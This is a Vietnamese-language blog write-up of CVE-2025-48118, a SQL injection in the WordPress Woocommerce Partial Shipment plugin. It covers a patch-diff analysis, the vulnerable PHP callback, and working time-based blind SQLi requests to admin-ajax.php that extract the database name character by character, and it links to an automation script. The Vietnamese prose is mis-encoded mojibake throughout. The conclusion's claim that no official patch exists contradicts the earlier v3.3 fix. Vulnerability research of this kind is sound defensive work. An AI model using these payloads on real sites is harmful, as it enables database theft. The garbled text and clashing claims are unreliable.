---
title: CVE-2025-48118 
description: Security Vulnerability in WordPress Woocommerce Partial Shipment Plugin.
date: 2025-09-10 14:54:00 +0700
categories: [Vulnerabilities, CVE Analyst]
tags: [analyst, plugin, sqli]
---

## Introduction
L·ªó h·ªïng x·∫£y ra tr√™n plugin **Woocommerce Partial Shipment** c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n **3.3**. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.
- **CVE ID**: [CVE-2025-48118](https://www.cve.org/CVERecord?id=CVE-2025-48118)
- **Product**: [WordPress Woocommerce Partial Shipment Plugin](https://wordpress.org/plugins/wc-partial-shipment/advanced/)
- **Vulnerability Type**: SQL Injection  
- **Affected Versions**: <= 3.2
- **CVSS severity**:  High (8.5)
- **Required Privilege**: Subscriber

## Requirements
- [**Local WordPress and Debugging**](https://w41bu1.github.io/posts/wordpress-local-and-debugging/)
- **Woocommerce Partial Shipment**:  v3.2(vul) v√† v3.3(fix)
- **diff tool**: **meld** ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version
- **Actived WooCommerce plugin**: plugin b·∫Øt bu·ªôc **actived** tr∆∞·ªõc khi c√†i **Woocommerce Partial Shipment Plugin**, m·ªôt s·ªë h√†m trong **WooCommerce** s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng.

## Analysis
Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ **POST** request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.

### Patch Diff
D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°.
C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file **wc-partial-shipment/woocommerce-partial-shipment.php**

Nh∆∞ng ·ªü ƒë√¢y, dev thay ƒë·ªïi kh√° nhi·ªÅu ta kh√≥ ƒë·ªÉ t√¨m ƒë∆∞·ª£c v·ªã tr√≠ l·ªói.

> Trong WordPress, ƒë·ªÉ SQLi x·∫£y ra, ·ª©ng d·ª•ng ph·∫£i t∆∞∆°ng t√°c v·ªõi database th√¥ng qua bi·∫øn global `$wpdb`, ta search t·ª´ kh√≥a n√†y trong file **wc-partial-shipment/woocommerce-partial-shipment.php** ƒë·ªÉ t√¨m sink. 
{: .prompt-tip }

![search sink](assets/img/posts/2025-09-10-CVE-2025-48118/search_sink.png)

`get_shipment_id` v√† `get_wxp_shipment_data` l√† 2 h√†m thu·ªôc class **WXP_Partial_Shipment** ƒë√°ng ch√∫ √Ω, d·ªØ li·ªáu ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o c√¢u query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t n√†o. Do ƒë√≥, l·ªó h·ªïng SQLi c√≥ th·ªÉ x·∫£y ra.

![Patch](assets/img/posts/2025-09-10-CVE-2025-48118/patch.png)

B·∫£n v√° s·ª≠ d·ª•ng `$wpdb->prepare()` ƒë·ªÉ chu·∫©n b·ªã c√¢u query, thay v√¨ **n·ªëi tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng**. ƒêi·ªÅu n√†y ƒë·∫£m b·∫£o r·∫±ng t·∫•t c·∫£ gi√° tr·ªã ƒë∆∞·ª£c **escape ƒë√∫ng c√°ch** tr∆∞·ªõc khi ch√®n v√†o SQL, ngƒÉn ng·ª´a nguy c∆° SQL Injection.

### How it work?
`get_shipment_id` v√† `get_wxp_shipment_data` ƒë·ªÅu ƒë∆∞·ª£c h√†m `wxp_order_set_shipped` trong c√πng class g·ªçi v√† s·ª≠ d·ª•ng.

```php
function wxp_order_set_shipped(){
    $order_id = isset($_POST['order_id']) ? $_POST['order_id'] : 0;
    // other logic

    $wxp_shipment = $this->get_wxp_shipment_data($order_id);
    if(isset($_POST['order_id']) && $_POST['order_id']){
        global $wpdb;
        $shipment_id = $this->get_shipment_id($_POST['order_id']);
        if(!$shipment_id){
            $data = array(
                'order_id' =>$order_id,
                'shipment_id' =>1,
                'shipment_url'=>'',
                'shipment_num'=>'',
                'shipment_date'=>current_time('timestamp',0),
            );
            $wpdb->insert($wpdb->prefix."partial_shipment",$data,array('%d','%d','%s','%s','%s'));
            $shipment_id = $wpdb->insert_id;
        }
    // other logic     
    }

    echo json_encode(array('order_id'=>$order_id,'status'=>$status_key));
    exit();
}
```

üëâ `order_id` ƒë∆∞·ª£c l·∫•y t·ª´ **POST request**, n∆°i ng∆∞·ªùi d√πng c√≥ th·ªÉ ki·ªÉm so√°t l√†m ƒë·ªëi s·ªë khi g·ªçi h√†m `get_shipment_id` v√† `get_wxp_shipment_data`
truy·ªÅn v√†o c√¢u query ch·ª©a l·ªï h·ªóng SQLi.

ƒê·ªÉ x√°c ƒë·ªãnh n∆°i `wxp_order_set_shipped` ƒë∆∞·ª£c g·ªçi v√† s·ª≠ d·ª•ng, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a `wxp_order_set_shipped` trong th∆∞ m·ª•c ch·ª©a plugin.

![Search 1](assets/img/posts/2025-09-10-CVE-2025-48118/search_1.png)

`wxp_order_set_shipped` ƒë∆∞·ª£c `construct` c·ªßa c√πng class s·ª≠ d·ª•ng l√†m callback cho hook `wp_ajax_wxp_order_set_shipped` => y√™u c·∫ßu ng∆∞·ªùi d√πng ph·∫£i ƒëƒÉng nh·∫≠p

üëâ Khi truy c·∫≠p v√†o `/wp-admin/admin-ajax.php` v·ªõi tham s·ªë:

```
action=wxp_order_set_shipped&order_id=payload_here
```

- Callback `wxp_order_set_shipped` ƒë∆∞·ª£c g·ªçi 
- `order_id` ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ request v√† ch√®n v√†o SQL query.
- Query th·ª±c thi 2 l·∫ßn do ƒë∆∞·ª£c truy·ªÅn v√†o 2 h√†m ch·∫°y l·ªánh SQL v·ªõi payload ƒë·ªôc h·∫°i.

## Exploit
### Detect SQLi

G·ª≠i **POST request** ch·ª©a payload SQLi.

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
...
Cookie: cookie_here

action=wxp_order_set_shipped&order_id=(SELECT 1 FROM (SELECT SLEEP(5))a)
```

Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh:

```sql
SELECT id as ship_id FROM wp_partial_shipment WHERE order_id=(SELECT 1 FROM (SELECT SLEEP(5))a)
```

·ªû ƒë√¢y c√≥ 2 n∆°i th·ª±c hi·ªán query n√™n th·ªùi gian ph·∫£n h·ªìi s·∫Ω tƒÉng g·∫•p ƒë√¥i

![time response](assets/img/posts/2025-09-10-CVE-2025-48118/time_resp.png)

Ta s·ª≠ d·ª•ng **subquery trong m·ªánh ƒë·ªÅ FROM** v√¨ truy v·∫•n con ƒë∆∞·ª£c coi nh∆∞ m·ªôt b·∫£ng t·∫°m th·ªùi. MySQL s·∫Ω th·ª±c thi truy v·∫•n con tr∆∞·ªõc ƒë·ªÉ t·∫°o b·∫£ng t·∫°m, sau ƒë√≥ m·ªõi th·ª±c hi·ªán truy v·∫•n ch√≠nh. Khi so s√°nh theo t·ª´ng row, `SLEEP` ch·ªâ ch·∫°y m·ªôt l·∫ßn trong qu√° tr√¨nh kh·ªüi t·∫°o b·∫£ng t·∫°m, c√°c l·∫ßn so s√°nh ti·∫øp theo s·∫Ω kh√¥ng th·ª±c thi l·∫°i, nh·ªù ƒë√≥ tr√°nh vi·ªác `SLEEP` b·ªã nh√¢n nhi·ªÅu l·∫ßn.

V√≠ d·ª• khi g·ª≠i request v·ªõi payload n√†y:

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
...
Cookie: cookie_here

action=wxp_order_set_shipped&order_id=(SELECT SLEEP(5))
```

Th·ªùi gian tr·∫£ v·ªÅ tƒÉng theo c·∫•p s·ªë nh√¢n

![search 2](assets/img/posts/2025-09-10-CVE-2025-48118/search_2.png)

### Get First Letter of Database Name
ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ **dump ƒë∆∞·ª£c h·∫øt data** l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.

G·ª≠i request v·ªõi **SQLi payload**:

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
...
Cookie: cookie_here

action=wxp_order_set_shipped&order_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a)
```

S·ª≠ d·ª•ng `SUBSTRING()` ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa **database name**, `IF()` tr·∫£ v·ªÅ `SLEEP(5)` n·∫øu k√Ω t·ª± ƒë√≥ l√† `0x77`('w')

S·ª≠ d·ª•ng hex encoding `w` th√†nh `0x77` v√¨ `order_id` ƒë∆∞·ª£c l·∫•y t·ª´ **POST** request trong n√™n b·ªã escape b·ªüi [magic quotes](https://patchstack.com/academy/wordpress/vulnerabilities/sql-injection/#magic-quotes) trong WordPress v√† b·ªüi `sanitize_text_field`.

üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi => k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† `w`.

D·ª±a tr√™n kƒ© thu·∫≠t **Timebased SQLi** ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.

[Script here](https://github.com/w41bu1/w41bu1.github.io/blob/main/assets/code/posts/2025-09-10-CVE-2025-48118/script.py)

## Conclusion
L·ªó h·ªïng **CVE-2025-48118** trong plugin WordPress **Woocommerce Partial Shipment** tr∆∞·ªõc phi√™n b·∫£n **3.3**, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.

Ch∆∞a c√≥ b·∫£n v√° ch√≠nh th·ª±c n√†o cho l·ªó h·ªïng n√†y.

**Key takeaways**:

- Ki·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng.
- Lu√¥n s·ª≠ d·ª•ng `$wpdb->prepare()` khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection.
- Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng.

## References

[SQL Injection cheat sheet - PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

[WordPress Woocommerce Partial Shipment Plugin <= 3.2 is vulnerable to SQL Injection](https://patchstack.com/database/wordpress/plugin/wc-partial-shipment/vulnerability/wordpress-woocommerce-partial-shipment-3-2-sql-injection-vulnerability)